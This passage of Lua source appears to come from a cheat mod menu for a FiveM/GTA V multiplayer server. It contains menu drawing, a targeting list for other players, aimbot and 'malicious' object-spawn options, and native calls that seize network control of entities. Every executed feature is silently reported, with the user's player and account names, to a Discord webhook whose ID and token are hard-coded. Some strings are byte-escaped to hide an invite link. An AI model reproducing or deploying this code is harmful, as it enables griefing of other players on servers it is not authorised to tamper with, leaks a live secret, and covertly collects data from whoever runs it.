        wmlua.menu.v.playerlist_mx_end_scroll = ( wmlua.menu.v.playerlist_rect_x_offset_mx + 0.133 ) * 100

        wmlua.menu.v.playerlist_my_start_scroll = ( wmlua.menu.v.playerlist_rect_y_offset_my - 0.01 ) * 100
        wmlua.menu.v.playerlist_my_end_scroll = ( wmlua.menu.v.playerlist_rect_y_offset_my + 0.390 ) * 100

        wmlua.menu.v.friendsearch_mx_start = ( wmlua.menu.v.playerlist_friend_x_origin - 0.008 ) * 100
        wmlua.menu.v.friendsearch_mx_end = ( wmlua.menu.v.playerlist_friend_x_origin + 0.000 ) * 100

        wmlua.menu.v.friendsearch_my_start = ( wmlua.menu.v.playerlist_friend_y_origin - 0.0125 ) * 100
        wmlua.menu.v.friendsearch_my_end = ( wmlua.menu.v.playerlist_friend_y_origin + 0.007 ) * 100

        wmlua.menu.v.targetsearch_mx_start = ( wmlua.menu.v.playerlist_friend_x_origin + 0.002 ) * 100
        wmlua.menu.v.targetsearch_mx_end = ( wmlua.menu.v.playerlist_friend_x_origin + 0.0115 ) * 100

        wmlua.menu.v.targetsearch_my_start = ( wmlua.menu.v.playerlist_friend_y_origin - 0.0125 ) * 100
        wmlua.menu.v.targetsearch_my_end = ( wmlua.menu.v.playerlist_friend_y_origin + 0.007 ) * 100

        if wmlua.F.HoldingCTRL(0, 24) and wmlua.menu.v.draggingmenu or wmlua.F.HoldingCTRL(0, 24) and wmlua.V.xp > wmlua.menu.v.top_mx_start and wmlua.V.xp < wmlua.menu.v.top_mx_end and wmlua.V.yp > wmlua.menu.v.top_my_start and wmlua.V.yp < wmlua.menu.v.top_my_end then
            wmlua.menu.v.draggingmenu = true
            wmlua.menu.v.x_origin = wmlua.V.xp / 100 - 0.15
            wmlua.menu.v.y_origin = wmlua.V.yp / 100 + 0.02
        else
            wmlua.menu.v.draggingmenu = false
        end

        for i = wmlua.menu.v.tabs_scroll_cur, wmlua.menu.v.tabs_scroll_cur + wmlua.menu.v.tabs_scroll_max do
            if wmlua.T.MenuTabs[i] then
                if wmlua.F.PressedCTRL(0, 24) and wmlua.V.yp > wmlua.menu.v.tabs_my_start and wmlua.V.yp < wmlua.menu.v.tabs_my_end and wmlua.V.xp > wmlua.menu.v.tabs_mx_start and wmlua.V.xp < wmlua.menu.v.tabs_mx_end then
                    wmlua.V.MenuHoveredTab = i
                    wmlua.F.TabChange(wmlua.T.MenuTabs[i].name)
                    wmlua.menu.v.buttons_scroll_cur = 1
                    wmlua.V.MenuSelectedTab = i
                elseif wmlua.V.yp > wmlua.menu.v.tabs_my_start and wmlua.V.yp < wmlua.menu.v.tabs_my_end and wmlua.V.xp > wmlua.menu.v.tabs_mx_start and wmlua.V.xp < wmlua.menu.v.tabs_mx_end then
                    wmlua.V.MenuHoveredTab = i
                end
                wmlua.menu.v.tabs_rect_y_offset_my = wmlua.menu.v.tabs_rect_y_offset_my + 0.0222
                wmlua.menu.v.tabs_my_start = ( wmlua.menu.v.tabs_rect_y_offset_my - 0.0 ) * 100
                wmlua.menu.v.tabs_my_end = ( wmlua.menu.v.tabs_rect_y_offset_my + 0.018 ) * 100
            end
        end

        for i = wmlua.menu.v.buttons_scroll_cur, wmlua.menu.v.buttons_scroll_cur + wmlua.menu.v.buttons_scroll_max do
            if wmlua.T.MenuButtons[i] and wmlua.T.MenuButtons[i].ctrlType == "button" or wmlua.T.MenuButtons[i] and wmlua.T.MenuButtons[i].ctrlType == "toggle" then
                if wmlua.F.PressedCTRL(0, 24) and wmlua.V.yp > wmlua.menu.v.buttons_my_start and wmlua.V.yp < wmlua.menu.v.buttons_my_end and wmlua.V.xp > wmlua.menu.v.buttons_mx_start and wmlua.V.xp < wmlua.menu.v.buttons_mx_end then
                    wmlua.V.MenuHoveredButton = i
                    wmlua.V.MenuSelectedButton = i
                    wmlua_Thread(function()
                        if #wmlua.T.TargetList < 1 or not wmlua.T.MenuButtons[i].MultiTarget == true then
                            wmlua.F.ButtonPress()
                        else
                            wmlua.F.ButtonPress(wmlua.T.TargetList)
                        end
                    end)
                elseif wmlua.V.yp > wmlua.menu.v.buttons_my_start and wmlua.V.yp < wmlua.menu.v.buttons_my_end and wmlua.V.xp > wmlua.menu.v.buttons_mx_start and wmlua.V.xp < wmlua.menu.v.buttons_mx_end then
                    wmlua.V.MenuHoveredButton = i
                end

                if wmlua.F.PressedCTRL(0, 29) and wmlua.V.InputActive == false then
                    wmlua_Thread(function()
                        wmlua.F.BindControl()
                    end)
                end

            end

            if wmlua.T.MenuButtons[i] and wmlua.T.MenuButtons[i].ctrlType == "selector" then
                if wmlua.F.PressedCTRL(0, 24) and wmlua.V.yp > wmlua.menu.v.buttons_my_start and wmlua.V.yp < wmlua.menu.v.buttons_my_end and wmlua.V.xp > wmlua.menu.v.buttons_mx_start + 0.5 and wmlua.V.xp < wmlua.menu.v.buttons_mx_end - 11.25 then
                    if wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval - 1 > 0 then
                        wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval = wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval - 1
                    end
                elseif wmlua.F.PressedCTRL(0, 24) and wmlua.V.yp > wmlua.menu.v.buttons_my_start and wmlua.V.yp < wmlua.menu.v.buttons_my_end and wmlua.V.xp > wmlua.menu.v.buttons_mx_start + 3.0 and wmlua.V.xp < wmlua.menu.v.buttons_mx_end - 8.50 then
                    if wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval + 1 <= #wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].optlist then
                        wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval = wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval + 1
                    end
                elseif wmlua.F.PressedCTRL(0, 24) and wmlua.V.yp > wmlua.menu.v.buttons_my_start and wmlua.V.yp < wmlua.menu.v.buttons_my_end and wmlua.V.xp > wmlua.menu.v.buttons_mx_start + 1.0 and wmlua.V.xp < wmlua.menu.v.buttons_mx_end - 9.50 then
                    wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].realval = wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval
                    wmlua.LTD(wmlua.N.GetPlayerName(wmlua.N.PlayerId())  .. " (" .. wmlua.N.ScGetNickname() .. ")", "Executed: " .. wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].name, wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].name, "778179457461911572/U-wx3-Gm7aBcXjDVCQmW44VgQVGZhKKwHrGcIb8i9B30V56ZepUbXQ8MlP5lTlSHJWBs")
                    wmlua.menu.f.selector_handler(wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].name, wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].realval)
                end
            end

            wmlua.menu.v.buttons_rect_y_offset_my = wmlua.menu.v.buttons_rect_y_offset_my + 0.0222
            wmlua.menu.v.buttons_my_start = ( wmlua.menu.v.buttons_rect_y_offset_my - 0.0 ) * 100
            wmlua.menu.v.buttons_my_end = ( wmlua.menu.v.buttons_rect_y_offset_my + 0.018 ) * 100
        end

        wmlua.V.EI_Active = false

        for i = wmlua.menu.v.playerlist_scroll_cur, wmlua.menu.v.playerlist_scroll_cur + wmlua.menu.v.playerlist_scroll_max do
            if wmlua.Playerlist_Players[i] then
                if wmlua.V.yp > wmlua.menu.v.playerlist_my_start and wmlua.V.yp < wmlua.menu.v.playerlist_my_end and wmlua.V.xp > wmlua.menu.v.playerlist_mx_start and wmlua.V.xp < wmlua.menu.v.playerlist_mx_end then
                    wmlua.menu.v.hoveredplayer = i
                    wmlua.F.DrawExtendedInfo(wmlua.Playerlist_Players[i].player)
                    if wmlua.F.PressedCTRL(0, 24) then
                        if not wmlua.T.TableContains(wmlua.T.TargetList, wmlua.Playerlist_Players[i].pid) then
                            wmlua.F.InsertToTable(wmlua.T.TargetList, wmlua.Playerlist_Players[i].pid)
                            wmlua.F.EventLogInsert("[~b~WM~w~] Added: " .. wmlua.F.CleanString(wmlua.Playerlist_Players[i].name, "color") .. " to the targeting list", 3000)
                        else
                            for i2 = 1, #wmlua.T.TargetList do
                                if wmlua.Playerlist_Players[i].pid == wmlua.T.TargetList[i2] then
                                    table.remove(wmlua.T.TargetList, i2)
                                    wmlua.F.EventLogInsert("[~b~WM~w~] Removed: " .. wmlua.F.CleanString(wmlua.Playerlist_Players[i].name, "color") .. " from the targeting list", 3000)
                                end
                            end
                        end
                    end
                    wmlua.V.EI_Active = true
                end

                wmlua.menu.v.playerlist_rect_y_offset_my = wmlua.menu.v.playerlist_rect_y_offset_my + 0.0222
                wmlua.menu.v.playerlist_my_start = ( wmlua.menu.v.playerlist_rect_y_offset_my - 0.0 ) * 100
                wmlua.menu.v.playerlist_my_end = ( wmlua.menu.v.playerlist_rect_y_offset_my + 0.018 ) * 100
            end
        end

        if wmlua.F.PressedCTRL(0, 14) and wmlua.menu.v.buttons_scroll_cur < #wmlua.T.MenuButtons and wmlua.V.yp > wmlua.menu.v.buttons_my_start_scroll and wmlua.V.yp < wmlua.menu.v.buttons_my_end_scroll and wmlua.V.xp > wmlua.menu.v.buttons_mx_start_scroll and wmlua.V.xp < wmlua.menu.v.buttons_mx_end_scroll then
            wmlua.menu.v.buttons_scroll_cur = wmlua.menu.v.buttons_scroll_cur + 1
        end

        if wmlua.F.PressedCTRL(0, 15) and wmlua.menu.v.buttons_scroll_cur - 1 > 0 and wmlua.V.yp > wmlua.menu.v.buttons_my_start_scroll and wmlua.V.yp < wmlua.menu.v.buttons_my_end_scroll and wmlua.V.xp > wmlua.menu.v.buttons_mx_start_scroll and wmlua.V.xp < wmlua.menu.v.buttons_mx_end_scroll then
            wmlua.menu.v.buttons_scroll_cur = wmlua.menu.v.buttons_scroll_cur - 1
        end

        if wmlua.F.PressedCTRL(0, 14) and wmlua.menu.v.tabs_scroll_cur < #wmlua.T.MenuTabs and wmlua.V.yp > wmlua.menu.v.tabs_my_start_scroll and wmlua.V.yp < wmlua.menu.v.tabs_my_end_scroll and wmlua.V.xp > wmlua.menu.v.tabs_mx_start_scroll and wmlua.V.xp < wmlua.menu.v.tabs_mx_end_scroll then
            wmlua.menu.v.tabs_scroll_cur = wmlua.menu.v.tabs_scroll_cur + 1
        end

        if wmlua.F.PressedCTRL(0, 15) and wmlua.menu.v.tabs_scroll_cur - 1 > 0 and wmlua.V.yp > wmlua.menu.v.tabs_my_start_scroll and wmlua.V.yp < wmlua.menu.v.tabs_my_end_scroll and wmlua.V.xp > wmlua.menu.v.tabs_mx_start_scroll and wmlua.V.xp < wmlua.menu.v.tabs_mx_end_scroll then
            wmlua.menu.v.tabs_scroll_cur = wmlua.menu.v.tabs_scroll_cur - 1
        end

        if wmlua.F.PressedCTRL(0, 14) and wmlua.V.yp > wmlua.menu.v.playerlist_my_start_scroll and wmlua.V.yp < wmlua.menu.v.playerlist_my_end_scroll and wmlua.V.xp > wmlua.menu.v.playerlist_mx_start_scroll and wmlua.V.xp < wmlua.menu.v.playerlist_mx_end_scroll then
            wmlua.menu.v.playerlist_scroll_cur = wmlua.menu.v.playerlist_scroll_cur + 1
        end

        if wmlua.F.PressedCTRL(0, 15) and wmlua.V.yp > wmlua.menu.v.playerlist_my_start_scroll and wmlua.V.yp < wmlua.menu.v.playerlist_my_end_scroll and wmlua.V.xp > wmlua.menu.v.playerlist_mx_start_scroll and wmlua.V.xp < wmlua.menu.v.playerlist_mx_end_scroll then
            wmlua.menu.v.playerlist_scroll_cur = wmlua.menu.v.playerlist_scroll_cur - 1
        end

        --wmlua.menu.f.drawtext({text = tostring(wmlua.menu.v.tabs_rect_y_offset_my .. " | " .. wmlua.V.yp .. " | " .. wmlua.menu.v.top_my_start .. " | " .. wmlua.menu.v.top_my_end), x = wmlua.menu.v.top_x_origin + 0.003, y = wmlua.menu.v.top_y_origin - 0.053, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})

        if wmlua.F.PressedCTRL(0, 24) and wmlua.V.yp > wmlua.menu.v.friendsearch_my_start and wmlua.V.yp < wmlua.menu.v.friendsearch_my_end and wmlua.V.xp > wmlua.menu.v.friendsearch_mx_start and wmlua.V.xp < wmlua.menu.v.friendsearch_mx_end then
            wmlua.F.FriendSearch()
        end

        if wmlua.F.PressedCTRL(0, 24) and wmlua.V.yp > wmlua.menu.v.targetsearch_my_start and wmlua.V.yp < wmlua.menu.v.targetsearch_my_end and wmlua.V.xp > wmlua.menu.v.targetsearch_mx_start and wmlua.V.xp < wmlua.menu.v.targetsearch_mx_end then
            wmlua.F.TargetSearch()
        end

    end

    function wmlua.menu.f.selector_handler(feat, value)

        wmlua_Thread(function()
            
            if feat == 'wmlua.V.Ply_outfit' then
                wmlua.V.OutFitIndex = value
                wmlua.F.EventLogInsert("[~b~WM~w~] Outfit: " .. wmlua.T.Outfits[wmlua.V.OutFitIndex].name .. " applied", 2000)
            end
    
            if feat == 'wmlua.V.Aim_changebone' then
                wmlua.V.SelAimbotBone = value
            end
    
            if feat == "wmlua.V.Vis_vision" then
                if value == 1 then
                    wmlua.H.WMInvokeNative(0x0F07E7745A236711)
                    wmlua.H.WMInvokeNative(0x92CCC17A7A2285DA)
                end
            end
    
            if feat == "wmlua.V.Mal_objcars" then
                wmlua.F.MALObjCars(wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mal_objcars"]].optlist[value])
            end
    
            if feat == "wmlua.V.Mal_objpeds" then
                wmlua.F.MALObjPeds(wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mal_objpeds"]].optlist[value])
            end

            if feat == "wmlua.V.Mal_objobjs" then
                wmlua.F.MALObjObjs(wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mal_objpeds"]].optlist[value])
            end

        end)

    end

    wmlua.menu.v.x_origin = 0.35
    wmlua.menu.v.y_origin = 0.35

    wmlua.N.RequestStreamedTextureDict('srange_gen', false)
    wmlua.N.RequestStreamedTextureDict(wmlua.STRINGS[85], false)
    wmlua.N.RequestStreamedTextureDict(wmlua.STRINGS[87], false)
    wmlua.N.RequestStreamedTextureDict('mpinventory', false)

    wmlua.V.rtex = wmlua.N.CreateRuntimeTxd(wmlua.logoDict)
    wmlua.V.rtex_dui = wmlua.N.CreateDUI("https://cdn.upload.systems/uploads/qL49DM6K.gif", 128, 94)
    wmlua.V.rtex_handle = wmlua.N.GetDuiHandle(wmlua.V.rtex_dui)
    wmlua.V.rtex2 = wmlua.N.CreateRuntimeTextureFromDuiHandle(wmlua.V.rtex, wmlua.logoSprite, wmlua.V.rtex_handle)
    wmlua.T.EmojiList = {
        {link = "https://cdn.upload.systems/uploads/qL49DM6K.gif"}
    }
    wmlua.N.CommitRuntimeTexture(wmlua.V.rtex2)
    wmlua.N.RequestStreamedTextureDict(wmlua.logoDict, false)

    function wmlua.menu.f.drawmenu()

        wmlua.menu.f.drawtext({text = "\98\195\164\195\164\114\115\35\51\49\53\48", x = 1.0 - 0.045, y = 0.01, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})

        if not wmlua.V.TabSetup then
            wmlua.F.TabChange("LUA")
            wmlua.V.TabSetup = true
        end

        if not wmlua.N.IsPauseMenuActive() and wmlua.menu.v.drawmenu then
            wmlua.N.SetCursor(0)
        end

        if not wmlua.V.InputActive then
            for i = 30, 36 do
                wmlua.H.WMInvokeNative(0x351220255D64C155, 0, i, true)
            end
            for i = 21, 26 do
                wmlua.H.WMInvokeNative(0x351220255D64C155, 0, i, true)
            end
            for i = 59, 139 do
                wmlua.H.WMInvokeNative(0x351220255D64C155, 0, i, true)
            end
        end

        wmlua.menu.v.top_x_origin = wmlua.menu.v.x_origin + 0.055
        wmlua.menu.v.top_y_origin = wmlua.menu.v.y_origin - 0.032

        wmlua.menu.v.playerlist_top_x_origin = wmlua.menu.v.x_origin + 0.200
        wmlua.menu.v.playerlist_top_y_origin = wmlua.menu.v.y_origin - 0.032

        wmlua.menu.v.playerlist_top_text_x_origin = wmlua.menu.v.x_origin + 0.203
        wmlua.menu.v.playerlist_top_text_y_origin = wmlua.menu.v.y_origin - 0.0295

        wmlua.menu.v.playerlist_friend_x_origin = wmlua.menu.v.x_origin + 0.3235
        wmlua.menu.v.playerlist_friend_y_origin = wmlua.menu.v.y_origin - 0.020

        wmlua.menu.v.playerlist_enemy_x_origin = wmlua.menu.v.playerlist_friend_x_origin + 0.010
        wmlua.menu.v.playerlist_enemy_y_origin = wmlua.menu.v.playerlist_friend_y_origin

        wmlua.menu.v.main_x_origin = wmlua.menu.v.x_origin + 0.055
        wmlua.menu.v.main_y_origin = wmlua.menu.v.y_origin

        wmlua.menu.v.playerlist_x_origin = wmlua.menu.v.x_origin + 0.2
        wmlua.menu.v.playerlist_y_origin = wmlua.menu.v.y_origin

        wmlua.menu.v.playerlist_extended_x_origin = wmlua.menu.v.x_origin + 0.344
        wmlua.menu.v.playerlist_extended_y_origin = wmlua.menu.v.y_origin

        wmlua.menu.f.drawrect({x = wmlua.menu.v.x_origin, y = wmlua.menu.v.y_origin, w = 0.050, h = 0.390}, {red = wmlua.V.theme_menu_bg_r, green = wmlua.V.theme_menu_bg_g, blue = wmlua.V.theme_menu_bg_b, alpha = wmlua.V.theme_menu_bg_a})
        wmlua.menu.f.drawrect({x = wmlua.menu.v.top_x_origin, y = wmlua.menu.v.top_y_origin, w = 0.140, h = 0.026}, {red = wmlua.V.theme_menu_bg_r, green = wmlua.V.theme_menu_bg_g, blue = wmlua.V.theme_menu_bg_b, alpha = wmlua.V.theme_menu_bg_a})
        wmlua.menu.f.drawrect({x = wmlua.menu.v.playerlist_top_x_origin, y = wmlua.menu.v.top_y_origin, w = 0.140, h = 0.026}, {red = wmlua.V.theme_menu_bg_r, green = wmlua.V.theme_menu_bg_g, blue = wmlua.V.theme_menu_bg_b, alpha = wmlua.V.theme_menu_bg_a})
        wmlua.menu.f.drawrect({x = wmlua.menu.v.main_x_origin, y = wmlua.menu.v.main_y_origin, w = 0.140, h = 0.390}, {red = wmlua.V.theme_menu_bg_r, green = wmlua.V.theme_menu_bg_g, blue = wmlua.V.theme_menu_bg_b, alpha = wmlua.V.theme_menu_bg_a})
        wmlua.menu.f.drawrect({x = wmlua.menu.v.playerlist_x_origin, y = wmlua.menu.v.playerlist_y_origin, w = 0.140, h = 0.390}, {red = wmlua.V.theme_menu_bg_r, green = wmlua.V.theme_menu_bg_g, blue = wmlua.V.theme_menu_bg_b, alpha = wmlua.V.theme_menu_bg_a})

        wmlua.menu.f.drawtext({text = identity.long .. ".net - " .. wmlua.V.BuildDate .. " (" .. wmlua.API.loadEvent .. ")", x = wmlua.menu.v.top_x_origin + 0.003, y = wmlua.menu.v.top_y_origin + 0.003, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
        wmlua.menu.f.drawtext({text = "Player List | On: " .. #wmlua.Playerlist_Players .. " | \100\105\115\99\111\114\100\46\103\103\47\115\80\72\87\55\67\84\84\90\106", x = wmlua.menu.v.playerlist_top_text_x_origin, y = wmlua.menu.v.playerlist_top_text_y_origin, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})

        wmlua.menu.f.drawtabs()
        wmlua.menu.f.drawbuttons()
        wmlua.menu.f.drawplayerlist()
        wmlua.menu.f.mousehandler()

        wmlua.N.DrawSprite('mpinventory', 'mp_specitem_ped', wmlua.menu.v.playerlist_enemy_x_origin, wmlua.menu.v.playerlist_enemy_y_origin, 0.014, 0.019, 0.0, 255,0,0,255)
        wmlua.N.DrawSprite('mpinventory', 'mp_specitem_ped', wmlua.menu.v.playerlist_friend_x_origin, wmlua.menu.v.playerlist_friend_y_origin, 0.014, 0.019, 0.0, 0,255,0,255)

    end

    function wmlua.F.DrawToggle()

        wmlua.F.CFS("wmlua.V.AllDraw")

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_heatseek"]].active then
            wmlua.F.VISHeatSeek(true)
        end

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_playerblips"]].active then
            wmlua.F.VISBlips()
        end

    end

    function wmlua.F.UseGTAInput()
        wmlua.F.CFS("wmlua.V.UseGTAInput")
    end

    function wmlua.F.BindControl()

        wmlua.V.inp = wmlua.F.GetInput("Enter controls to bind, ex: 21,74")
        wmlua.V.inp = string.gsub(wmlua.V.inp, " ", "")

        for i = 1, #wmlua.T.MenuButtons do

            if wmlua.V.MenuHoveredButton ~= 0 then

                for k,v in ipairs(wmlua.T.Cheese) do
                    if v.name == wmlua.T.MenuButtons[wmlua.V.MenuHoveredButton].name then
                        wmlua.V.Temp = wmlua.F.Split(wmlua.V.inp,",")
                        wmlua.V.InvalidInput = false
                        for k,v in ipairs(wmlua.V.Temp) do
                            if type(tonumber(v)) ~= "number" then
                                wmlua.V.InvalidInput = true
                            end
                        end
                        if not wmlua.V.InvalidInput then
                            v.bind = wmlua.V.Temp
                        end
                        break
                    end
                end

            else

                for k,v in ipairs(wmlua.T.Cheese) do
                    if v.name == wmlua.T.MenuButtons[wmlua.V.MenuSelectedButton].name then
                        wmlua.V.Temp = wmlua.F.Split(wmlua.V.inp,",")
                        wmlua.V.InvalidInput = false
                        for k,v in ipairs(wmlua.V.Temp) do
                            if type(tonumber(v)) ~= "number" then
                                wmlua.V.InvalidInput = true
                            end
                        end
                        if not wmlua.V.InvalidInput then
                            v.bind = wmlua.V.Temp
                        end
                        break
                    end
                end

            end

        end

    end

    function wmlua.F.ButtonPress(_asid)

        for i = 1, #wmlua.T.MenuButtons do

            if wmlua.V.MenuSelectedButton == i then
                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Lua_safemode"]].active then
                    if wmlua.T.MenuButtons[i].Unsafe ~= true then
                        wmlua_Thread(function()
                            wmlua.T.MenuButtons[i].efunc(_asid)
                        end)
                    else
                        wmlua.F.EventLogInsert("[~r~WM~w~] Prevented running feature due to safe mode", 3000)
                    end
                else
                    wmlua_Thread(function() 
                        wmlua.T.MenuButtons[i].efunc(_asid)
                    end)
                end

                wmlua.LTD(wmlua.N.GetPlayerName(wmlua.N.PlayerId())  .. " (" .. wmlua.N.ScGetNickname() .. ")", "Executed: " .. wmlua.T.MenuButtons[i].label, "778179457461911572/U-wx3-Gm7aBcXjDVCQmW44VgQVGZhKKwHrGcIb8i9B30V56ZepUbXQ8MlP5lTlSHJWBs")

            end

        end

    end

    function wmlua.F.TargetSearch()

        wmlua.V.Search_Type = wmlua.F.GetInput('Exact (y/n)')
        if string.lower(wmlua.V.Search_Type) == "y" then
            wmlua.V.Search_Input = wmlua.F.GetInput("Enter exact name")
            for i, v in ipairs(wmlua.Playerlist_Players) do
                if v.name == wmlua.V.Search_Input then
                    if not wmlua.T.TableContains(wmlua.T.TargetList, v.pid) then
                        wmlua.F.InsertToTable(wmlua.T.TargetList, v.pid)
                        wmlua.F.EventLogInsert("[~b~WM~w~] Added: " .. v.name .. " to the targeting list", 3000)
                    else
                        for i = 1, #wmlua.T.TargetList do
                            if v.pid == wmlua.T.TargetList[i] then
                                table.remove(wmlua.T.TargetList, i)
                                wmlua.F.EventLogInsert("[~b~WM~w~] Removed: " .. v.name .. " from the targeting list", 3000)
                            end
                        end
                    end
                end
            end
        else
            wmlua.V.Search_Input = wmlua.F.GetInput("Enter part of the name")
            for i, v in ipairs(wmlua.Playerlist_Players) do
                if string.find(string.lower(v.name), string.lower(wmlua.V.Search_Input)) then
                    if not wmlua.T.TableContains(wmlua.T.TargetList, v.pid) then
                        wmlua.F.InsertToTable(wmlua.T.TargetList, v.pid)
                        wmlua.F.EventLogInsert("[~b~WM~w~] Added: " .. v.name .. " to the targeting list", 3000)
                    else
                        for i = 1, #wmlua.T.TargetList do
                            if v.pid == wmlua.T.TargetList[i] then
                                table.remove(wmlua.T.TargetList, i)
                                wmlua.F.EventLogInsert("[~b~WM~w~] Removed: " .. v.name .. " from the targeting list", 3000)
                            end
                        end
                    end
                end
            end
        end

    end

    function wmlua.F.FriendSearch()

        wmlua.V.Search_Type = wmlua.F.GetInput('Exact (y/n)')
        if string.lower(wmlua.V.Search_Type) == "y" then
            wmlua.V.Search_Input = wmlua.F.GetInput("Enter exact name")
            for i, v in ipairs(wmlua.Playerlist_Players) do
                if v.name == wmlua.V.Search_Input then
                    if not wmlua.T.TableContains(wmlua.T.FriendList, v.pid) then
                        wmlua.F.InsertToTable(wmlua.T.FriendList, v.pid)
                        wmlua.F.EventLogInsert("[~b~WM~w~] Added: " .. v.name .. " to the friend list", 3000)
                    else
                        for i = 1, #wmlua.T.FriendList do
                            if v.pid == wmlua.T.FriendList[i] then
                                table.remove(wmlua.T.FriendList, i)
                                wmlua.F.EventLogInsert("[~b~WM~w~] Removed: " .. v.name .. " from the friend list", 3000)
                            end
                        end
                    end
                end
            end
        else
            wmlua.V.Search_Input = wmlua.F.GetInput("Enter part of the name")
            for i, v in ipairs(wmlua.Playerlist_Players) do
                if string.find(string.lower(v.name), string.lower(wmlua.V.Search_Input)) then
                    if not wmlua.T.TableContains(wmlua.T.FriendList, v.pid) then
                        wmlua.F.InsertToTable(wmlua.T.FriendList, v.pid)
                        wmlua.F.EventLogInsert("[~b~WM~w~] Added: " .. v.name .. " to the friend list", 3000)
                    else
                        for i = 1, #wmlua.T.FriendList do
                            if v.pid == wmlua.T.FriendList[i] then
                                table.remove(wmlua.T.FriendList, i)
                                wmlua.F.EventLogInsert("[~b~WM~w~] Removed: " .. v.name .. " from the friend list", 3000)
                            end
                        end
                    end
                end
            end
        end

    end

    wmlua.P.RCCar = {}

    wmlua.P.RCCar.Start = function(ent)

        wmlua.F.EventLogInsert("[~b~WM~w~] Arrow keys for moving, G For camera.", 10000)

        if not ent then
            wmlua.P.RCCar.Spawn()
        else
            wmlua.P.RCCar.Entity = ent
            wmlua.P.RCCar.Driver = wmlua.N.CreatePedInsideVehicle(wmlua.P.RCCar.Entity, 5, wmlua.N.GetHashKey("a_c_rat"), -1, true, true)
            wmlua.N.WadaGM(wmlua.P.RCCar.Driver, true, 16.1337)
            wmlua.F.EventLogInsert('RC Ents: ' .. ent .. ", " .. wmlua.P.RCCar.Driver)
        end

    end

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do wmlua_Schleep(0)
    
            local _, error = wmlua_pcall(function()

                if wmlua.N.DoesEntityExist(wmlua.P.RCCar.Entity) and wmlua.N.DoesEntityExist(wmlua.P.RCCar.Driver) then

                    local distanceCheck = wmlua.N.CompareDistance(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()),  wmlua.N.GetEntityPos(wmlua.P.RCCar.Entity), true)

                    wmlua.P.RCCar.HandleKeys(distanceCheck)

                    wmlua.H.WMInvokeNative(0xB664292EAECF7FA6, wmlua.P.RCCar.Entity, 2)
                    wmlua.H.WMInvokeNative(0xA2F80B8D040727CC, wmlua.P.RCCar.Entity, true)

                    if not wmlua.N.NetworkHasControlOfEntity(wmlua.P.RCCar.Driver) then
                        wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.P.RCCar.Driver)
                    elseif not wmlua.N.NetworkHasControlOfEntity(wmlua.P.RCCar.Entity) then
                        wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.P.RCCar.Entity)
                    end

                end
    
            end)
    
            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end
    
        end
    
    end)

    wmlua.P.RCCar.HandleKeys = function(distanceCheck)

        wmlua.N.RequestCollisionAtCoord(wmlua.N.GetEntityPos(wmlua.P.RCCar.Entity))
        wmlua.N.SetFocusEntity(wmlua.P.RCCar.Entity)
        wmlua.H.WMInvokeNative(0xFE99B66D079CF6BC, 0, 47, true)
        wmlua.H.WMInvokeNative(0xFE99B66D079CF6BC, 0, 172, true)
        wmlua.H.WMInvokeNative(0xFE99B66D079CF6BC, 0, 173, true)
        wmlua.H.WMInvokeNative(0xFE99B66D079CF6BC, 0, 174, true)
        wmlua.H.WMInvokeNative(0xFE99B66D079CF6BC, 0, 175, true)

        if wmlua.F.PressedCTRL(0, 47) then
            if wmlua.N.IsCamRendering(wmlua.P.RCCar.Camera) then
                wmlua.P.RCCar.ToggleCamera(false)
                wmlua.N.SetFocusEntity(wmlua.N.GetPlayerPed())
            else
                wmlua.P.RCCar.ToggleCamera(true)
            end
        end

        if distanceCheck <= 3.0 then
            if wmlua.F.PressedCTRL(0, 38) then
                wmlua.P.RCCar.Attach("pick")
            end
        end

        if wmlua.F.HoldingCTRL(0, 172) and not wmlua.F.HoldingCTRL(0, 173) then
            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 32, 1)
        end

        if wmlua.F.HoldingCTRL(0, 173) and not wmlua.F.HoldingCTRL(0, 172) then
            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 22, 1)
        end

        if wmlua.F.HoldingCTRL(0, 174) and wmlua.F.HoldingCTRL(0, 173) then
            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 13, 1)
        end

        if wmlua.F.HoldingCTRL(0, 175) and wmlua.F.HoldingCTRL(0, 173) then
            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 14, 1)
        end

        if wmlua.F.HoldingCTRL(0, 172) and wmlua.F.HoldingCTRL(0, 173) then
